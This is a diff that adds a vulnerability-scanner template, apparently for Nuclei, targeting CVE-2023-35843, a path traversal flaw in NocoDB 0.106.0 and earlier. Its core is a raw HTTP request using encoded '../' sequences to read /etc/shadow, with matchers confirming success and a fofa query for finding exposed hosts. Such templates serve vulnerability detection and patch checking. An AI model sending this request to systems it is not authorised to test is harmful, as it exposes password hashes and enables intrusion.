@@ -1,0 +1,29 @@
+id: CVE-2023-35843
+info:
+  name: xxx
+  author: mike
+  severity: info
+  description: NocoDB是一个开源 Airtable 替代品。将任何 MySql、PostgreSql、Sql Server、Sqlite 和 MariaDb 转换为智能电子表格。NocoDB 0.106.0版本及之前版本存在安全漏洞。攻击者利用该漏洞可以访问服务器上的任意文件。
+  reference: xxx
+  remediation: update to version 0.106.1 
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: "NocoDB"
+http:
+  - raw:
+      - |
+        GET /download/..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow HTTP/1.1
+        Host: {{Hostname}}  
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root"
